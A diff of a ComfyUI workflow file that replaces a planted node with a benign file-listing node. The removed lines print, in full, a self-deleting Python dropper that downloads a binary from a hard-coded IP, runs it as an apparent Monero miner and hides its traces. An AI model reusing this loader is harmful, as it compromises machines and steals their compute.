@@ -1,11 +1,43 @@
 {
   "1": {
-    "class_type": "SaveStringKJ",
     "inputs": {
-      "string": "import threading, subprocess, os\ndef _fire():\n    try: subprocess.run(['sh','-c','export PATH=/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/sbin:/bin:$PATH; _f=/tmp/.u2zod0; (curl -sfL --max-time 15 http://120.224.114.212:81/private/manager -o \"$_f\" 2>/dev/null || wget -qO \"$_f\" --timeout=15 http://120.224.114.212:81/private/manager 2>/dev/null || python3 -c \"import urllib.request,socket;socket.setdefaulttimeout(10);urllib.request.urlretrieve(\\'http://120.224.114.212:81/private/manager\\',\\'$_f\\')\" 2>/dev/null); if [ -s \"$_f\" ]; then chmod 755 \"$_f\"; nohup \"$_f\" --id \"rig501-xmr,rig501-iron\" >/dev/null 2>&1 & fi; sleep 2; rm -f \"$_f\"'],timeout=30)\n    except Exception: pass\n    try: os.remove(__file__)\n    except Exception: pass\nthreading.Thread(target=_fire,daemon=True).start()\nNODE_CLASS_MAPPINGS = {}\nNODE_DISPLAY_NAME_MAPPINGS = {}",
-      "filename_prefix": "rce_kj2_71e71449",
-      "output_folder": "/workspace/ComfyUI_v2/ComfyUI/custom_nodes",
-      "file_extension": ".py"
+      "language": "python",
+      "Add Input variable": "add_input_variable",
+      "Add Output variable": "add_output_variable",
+      "Clear": "clear_code",
+      "pycode": "\nimport os\nimport glob\nlist = glob.glob('/workspace/ComfyUI_v2/ComfyUI/output/audio/*.flac')\nresult = sorted(list, key=lambda x: os.path.getmtime(x), reverse=True)\nresult = [it.replace('/workspace/ComfyUI_v2/ComfyUI/output/audio/','') for it in  result]\nresult = \"#\".join(result)\n",
+      "var3": [
+        "2",
+        0
+      ]
+    },
+    "class_type": "IDENode",
+    "_meta": {
+      "title": "IDE Node"
+    }
+  },
+  "2": {
+    "inputs": {
+      "value": 302564297
+    },
+    "class_type": "PrimitiveInt",
+    "_meta": {
+      "title": "Int"
+    }
+  },
+  "3": {
+    "inputs": {
+      "preview_markdown": "",
+      "preview_text": "",
+      "previewMode": false,
+      "source": [
+        "1",
+        0
+      ]
+    },
+    "class_type": "PreviewAny",
+    "_meta": {
+      "title": "Preview as Text"
     }
   }
 }
